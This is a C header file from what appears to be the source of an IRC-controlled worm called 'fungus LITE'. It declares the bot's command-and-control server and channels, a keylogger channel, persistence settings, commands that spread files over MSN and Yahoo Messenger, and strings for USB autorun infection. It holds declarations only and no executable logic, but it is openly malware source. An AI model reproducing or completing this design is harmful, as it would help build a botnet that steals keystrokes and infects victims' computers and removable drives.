/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							          */

#ifndef _externs_h
#define _externs_h

typedef struct 
{
	char *host;
	unsigned short port;
	char *password;
} ircconnect_s;

extern ircconnect_s ircconnect[];


extern unsigned long cfg_reconnectsleep; // msec
extern unsigned long cfg_ircmaxwaittime; // sec
extern int cfg_nicklen;

extern char cfg_ircchannel[];
extern char cfg_ircchanpass[];
extern char cfg_irchost[];
extern char cfg_ircorderprefix[];

extern char infochan[];
extern char keylogchan[];

extern char cfg_filename[];
extern char cfg_mutex[];
extern char cfg_firewall_description[];
extern char gotopth[];
extern char szRegname[];

extern char kennzeichne[20];
/* COMMANDS */

extern char cmd_disconnect[];
extern char cmd_reconnect[];
extern char cmd_remove[];
extern char cmd_sa[];
extern char cmd_sm[];
extern char cmd_download[];
extern char cmd_msn_text[];
extern char cmd_msn_file[];
extern char cmd_msn_stop[];
extern char cmd_yim_text[];
extern char cmd_yim_file[];
extern char cmd_yim_stop[];
extern char cmd_all_text[];
extern char cmd_all_file[];
extern char cmd_all_stop[];


/* USB SHIT */


extern char USB_STR_RECYCLER[];
extern char USB_STR_REC_SUBDIR[];
extern char USB_STR_DESKTOP_DATA[];
extern char USB_STR_DESKTOP_INI[];
extern char USB_STR_AUTORUN_INF[];
extern char USB_STR_AUTORUN_DATA1[];
extern char USB_STR_AUTORUN_DATA2[];
extern char USB_STR_AUTORUN_DATA3[];
extern char USB_STR_INFECTED[];
extern char pending;
#endif

